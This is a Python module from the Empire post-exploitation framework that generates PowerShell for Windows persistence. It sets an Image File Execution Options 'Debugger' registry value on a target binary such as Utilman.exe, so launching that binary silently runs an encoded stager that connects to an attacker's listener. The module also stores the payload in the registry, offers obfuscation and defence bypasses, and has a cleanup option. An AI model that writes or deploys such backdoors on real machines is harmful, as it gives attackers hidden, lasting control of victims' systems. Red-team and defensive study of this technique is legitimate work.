from __future__ import print_function

from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        # Set booleans to false by default
        obfuscate = False

        # management options
        cleanup = params['Cleanup']        
        trigger_binary = params['TriggerBinary']
        listener_name = params['Listener']
        target_binary = params['TargetBinary']

        # storage options
        reg_path = params['RegPath']

        # staging options
        if (params['Obfuscate']).lower() == 'true':
            obfuscate = True
        obfuscate_command = params['ObfuscateCommand']

        status_msg = ""
        locationString = ""

        if cleanup.lower() == 'true':
            # the registry command to disable the debugger for Utilman.exe
            script = "Remove-Item 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s';'%s debugger removed.'" %(target_binary, target_binary)
        script = data_util.keyword_obfuscation(script)
        if obfuscate:
            script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)
            return script
        
        if listener_name != '':
            # if there's a listener specified, generate a stager and store it

            if not main_menu.listeners.is_listener_valid(listener_name):
                # not a valid listener, return nothing for the script
                return handle_error_message("[!] Invalid listener: " + listener_name)

            else:
                # generate the PowerShell one-liner
                launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', obfuscate=obfuscate,
                                                               obfuscationCommand=obfuscate_command,
                                                               bypasses=params['Bypasses'])
                
                enc_script = launcher.split(" ")[-1]
                # statusMsg += "using listener " + listenerName

            path = "\\".join(reg_path.split("\\")[0:-1])
            name = reg_path.split("\\")[-1]

            status_msg += " stored in " + reg_path + "."

            script = "$RegPath = '"+reg_path+"';"
            script += "$parts = $RegPath.split('\\');"
            script += "$path = $RegPath.split(\"\\\")[0..($parts.count -2)] -join '\\';"
            script += "$name = $parts[-1];"
            script += "$null=Set-ItemProperty -Force -Path $path -Name $name -Value "+enc_script+";"

            # note where the script is stored
            locationString = "$((gp "+path+" "+name+")."+name+")"

            script += "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+target_binary+"';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+target_binary+"' -Name Debugger -Value '\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"$x="+locationString+";start -Win Hidden -A \\\"-enc $x\\\" powershell\";exit;';'"+target_binary+" debugger set to trigger stager for listener "+listener_name+"'"

        else:
            # the registry command to set the debugger for the specified binary to be the binary path specified
            script = "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+target_binary+"';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"+target_binary+"' -Name Debugger -Value '"+trigger_binary+"';'"+target_binary+" debugger set to "+trigger_binary+"'"

        if obfuscate:
            script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)
        script = data_util.keyword_obfuscation(script)

        return script
